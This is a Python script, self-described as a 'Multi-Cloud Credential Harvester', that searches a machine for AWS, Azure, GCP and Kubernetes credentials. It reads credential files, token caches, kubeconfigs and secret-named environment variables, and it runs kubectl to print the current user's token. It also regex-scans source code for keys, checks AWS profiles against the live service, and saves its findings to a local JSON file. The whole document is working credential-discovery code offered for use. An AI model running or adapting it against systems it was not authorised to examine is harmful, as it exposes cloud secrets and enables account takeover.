#!/usr/bin/env python3
"""
Multi-Cloud Credential Harvester
Systematically extracts credentials from environment,configuration files, and cloud services.
Validates and catalogs all discovered credentials.
"""

import subprocess
import json
import os
import re
import sys
from pathlib import Path
from typing import List, Dict

class CredentialHarvester:
    def __init__(self):
        self.credentials = []
        self.pattern_signatures = {
            'aws_access_key': r'AKIA[0-9A-Z]{16}',
            'aws_secret_key': r'aws_secret_access_key\s*=\s*[A-Za-z0-9/+=]{40}',
            'azure_subscription': r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
            'gcp_service_account': r'[a-z0-9\-]+@[a-z0-9\-]+\.iam\.gserviceaccount\.com',
            'api_key': r'api[_-]?key[\"\']?\s*[:=]\s*[\"\']?[a-zA-Z0-9\-_]{20,}',
            'connection_string': r'(mongodb|postgresql|mysql|sql|cosmosdb).*://',
            'jwt_token': r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        }
    
    def harvest_aws_credentials(self):
        """Extract AWS credentials"""
        print("[*] Harvesting AWS credentials...")
        
        try:
            # Check credential files
            aws_cred_file = Path.home() / '.aws' / 'credentials'
            if aws_cred_file.exists():
                with open(aws_cred_file, 'r') as f:
                    content = f.read()
                    profiles = re.findall(r'\[([^\]]+)\]', content)
                    for profile in profiles:
                        self.credentials.append({
                            "type": "AWS Profile",
                            "profile": profile,
                            "location": str(aws_cred_file)
                        })
            
            # Get current AWS credentials in use
            for key in ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN']:
                if key in os.environ:
                    self.credentials.append({
                        "type": "AWS Environment Variable",
                        "variable": key,
                        "value_length": len(os.environ[key]),
                        "first_char": os.environ[key][0]
                    })
            
            # List AWS CLI credential cache
            cache_dir = Path.home() / '.aws' / 'cli' / 'cache'
            if cache_dir.exists():
                for cache_file in cache_dir.glob('*.json'):
                    try:
                        with open(cache_file, 'r') as f:
                            cache_data = json.load(f)
                            if 'Credentials' in cache_data:
                                self.credentials.append({
                                    "type": "AWS CLI Cache",
                                    "file": cache_file.name,
                                    "has_credentials": True
                                })
                    except:
                        pass
        
        except Exception as e:
            print(f"  [-] AWS harvesting error: {str(e)}")
    
    def harvest_azure_credentials(self):
        """Extract Azure credentials"""
        print("[*] Harvesting Azure credentials...")
        
        try:
            # Check Azure CLI cache
            azure_cache = Path.home() / '.azure'
            if azure_cache.exists():
                # Get current subscription context
                result = subprocess.run(
                    ["az", "account", "show", "--output", "json"],
                    capture_output=True, text=True, timeout=10
                )
                
                if result.returncode == 0:
                    account = json.loads(result.stdout)
                    self.credentials.append({
                        "type": "Azure Current Account",
                        "user": account.get('user', {}).get('name'),
                        "subscription": account.get('name'),
                        "subscription_id": account.get('id')
                    })
                
                # Check for stored credentials
                access_tokens_dir = azure_cache / 'msal_token_cache.json'
                if access_tokens_dir.exists():
                    self.credentials.append({
                        "type": "Azure Token Cache",
                        "location": str(access_tokens_dir),
                        "exists": True
                    })
            
            # Check environment variables
            for key in ['AZURE_SUBSCRIPTION_ID', 'AZURE_TENANT_ID', 'AZURE_CLIENT_ID']:
                if key in os.environ:
                    self.credentials.append({
                        "type": "Azure Environment Variable",
                        "variable": key,
                        "value": os.environ[key]
                    })
        
        except Exception as e:
            print(f"  [-] Azure harvesting error: {str(e)}")
    
    def harvest_gcp_credentials(self):
        """Extract GCP credentials"""
        print("[*] Harvesting GCP credentials...")
        
        try:
            # Check GCP configurations
            gcp_config = Path.home() / '.config' / 'gcloud'
            if gcp_config.exists():
                # Get current project
                result = subprocess.run(
                    ["gcloud", "config", "get-value", "project"],
                    capture_output=True, text=True, timeout=10
                )
                
                if result.returncode == 0:
                    self.credentials.append({
                        "type": "GCP Current Project",
                        "project": result.stdout.strip()
                    })
                
                # List all configurations
                creds_dir = gcp_config / 'configurations'
                if creds_dir.exists():
                    configs = list(creds_dir.glob('config_*'))
                    self.credentials.append({
                        "type": "GCP Configurations",
                        "count": len(configs),
                        "location": str(creds_dir)
                    })
            
            # Check for service account keys in home directory
            for json_file in Path.home().rglob('*-key.json'):
                try:
                    with open(json_file, 'r') as f:
                        key_data = json.load(f)
                        if 'client_email' in key_data:
                            self.credentials.append({
                                "type": "GCP Service Account Key",
                                "service_account": key_data.get('client_email'),
                                "file": str(json_file),
                                "project_id": key_data.get('project_id')
                            })
                except:
                    pass
            
            # Check environment
            for key in ['GOOGLE_APPLICATION_CREDENTIALS']:
                if key in os.environ:
                    self.credentials.append({
                        "type": "GCP Environment Credentials",
                        "variable": key,
                        "file": os.environ[key]
                    })
        
        except Exception as e:
            print(f"  [-] GCP harvesting error: {str(e)}")
    
    def harvest_kubernetes_credentials(self):
        """Extract Kubernetes credentials"""
        print("[*] Harvesting Kubernetes credentials...")
        
        try:
            # Check kubeconfig
            kubeconfig_paths = [
                Path.home() / '.kube' / 'config',
                Path('/etc/kubernetes/admin.conf'),
                Path('/root/.kube/config')
            ]
            
            for kubeconfig in kubeconfig_paths:
                if kubeconfig.exists():
                    try:
                        with open(kubeconfig, 'r') as f:
                            content = f.read()
                            # Extract contexts
                            contexts = re.findall(r'current-context: (.+)', content)
                            if contexts:
                                self.credentials.append({
                                    "type": "Kubernetes Current Context",
                                    "context": contexts[0],
                                    "kubeconfig": str(kubeconfig)
                                })
                            
                            # Find certificates and tokens
                            if 'certificate-data' in content:
                                self.credentials.append({
                                    "type": "Kubernetes Certificate",
                                    "location": str(kubeconfig),
                                    "has_cert": True
                                })
                    except:
                        pass
            
            # Check current kubeconfig env variable
            if 'KUBECONFIG' in os.environ:
                self.credentials.append({
                    "type": "Kubernetes Environment",
                    "variable": 'KUBECONFIG',
                    "paths": os.environ['KUBECONFIG']
                })
            
            # Get current context
            result = subprocess.run(
                ["kubectl", "config", "current-context"],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode == 0:
                self.credentials.append({
                    "type": "Kubernetes Active Context",
                    "context": result.stdout.strip()
                })
            
            # Get current user
            result = subprocess.run(
                ["kubectl", "auth", "whoami", "--show-token"],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode == 0:
                self.credentials.append({
                    "type": "Kubernetes Current User",
                    "output": result.stdout.strip()
                })
        
        except Exception as e:
            print(f"  [-] Kubernetes harvesting error: {str(e)}")
    
    def harvest_from_source_code(self, path: str = "."):
        """Search source code for credentials"""
        print(f"[*] Searching {path} for hardcoded credentials...")
        
        code_extensions = ['.py', '.js', '.go', '.java', '.cs', '.yaml', '.yml', '.json', '.tf']
        found_count = 0
        
        for ext in code_extensions:
            try:
                for file_path in Path(path).rglob(f'*{ext}'):
                    if '.git' in str(file_path) or '__pycache__' in str(file_path):
                        continue
                    
                    try:
                        with open(file_path, 'r', errors='ignore') as f:
                            content = f.read()
                            
                            for pattern_name, pattern in self.pattern_signatures.items():
                                matches = re.findall(pattern, content, re.IGNORECASE)
                                if matches:
                                    self.credentials.append({
                                        "type": "Source Code Credential",
                                        "pattern": pattern_name,
                                        "file": str(file_path),
                                        "match_count": len(matches)
                                    })
                                    found_count += 1
                    except:
                        pass
            except:
                pass
        
        print(f"  [+] Found {found_count} potential credential patterns in source")
    
    def harvest_from_environment(self):
        """Extract credentials from environment variables"""
        print("[*] Harvesting environment variables...")
        
        suspicious_keys = [
            'KEY', 'TOKEN', 'SECRET', 'PASSWORD', 'CREDENTIAL',
            'API_KEY', 'ACCESS_KEY', 'PRIVATE_KEY', 'AWS', 'AZURE', 'GCP',
            'GITHUB', 'DOCKER', 'DATABASE', 'MONGODB', 'POSTGRES'
        ]
        
        for key, value in os.environ.items():
            if any(susp in key.upper() for susp in suspicious_keys):
                self.credentials.append({
                    "type": "Environment Variable",
                    "key": key,
                    "value_length": len(str(value)),
                    "first_chars": str(value)[:10]
                })
    
    def validate_credentials(self):
        """Attempt to validate discovered credentials"""
        print("[*] Validating credentials...")
        
        validated = 0
        
        # Test AWS credentials
        for cred in self.credentials:
            if cred.get('type') == 'AWS Profile':
                result = subprocess.run(
                    ["aws", "sts", "get-caller-identity",
                     "--profile", cred['profile']],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode == 0:
                    cred['validated'] = True
                    cred['account_id'] = json.loads(result.stdout).get('Account')
                    validated += 1
        
        print(f"  [+] Validated {validated} credentials")
    
    def export_findings(self, output_file="harvested_credentials.json"):
        """Export discovered credentials"""
        report = {
            "total_credentials_found": len(self.credentials),
            "by_type": {},
            "credentials": self.credentials
        }
        
        for cred in self.credentials:
            cred_type = cred.get('type', 'Unknown')
            report['by_type'][cred_type] = report['by_type'].get(cred_type, 0) + 1
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n[+] Credentials harvested to: {output_file}")
        print(f"[!] Total credentials found: {len(self.credentials)}")
        
        for cred_type, count in report['by_type'].items():
            print(f"  {cred_type}: {count}")

if __name__ == "__main__":
    harvester = CredentialHarvester()
    
    harvester.harvest_aws_credentials()
    harvester.harvest_azure_credentials()
    harvester.harvest_gcp_credentials()
    harvester.harvest_kubernetes_credentials()
    harvester.harvest_from_environment()
    
    # Optional: search current directory
    if len(sys.argv) > 1 and sys.argv[1] != '--validate':
        harvester.harvest_from_source_code(sys.argv[1])
    
    if '--validate' in sys.argv:
        harvester.validate_credentials()
    
    output_file = "harvested_credentials.json"
    if '--output' in sys.argv:
        idx = sys.argv.index('--output')
        if idx + 1 < len(sys.argv):
            output_file = sys.argv[idx + 1]
    
    harvester.export_findings(output_file)
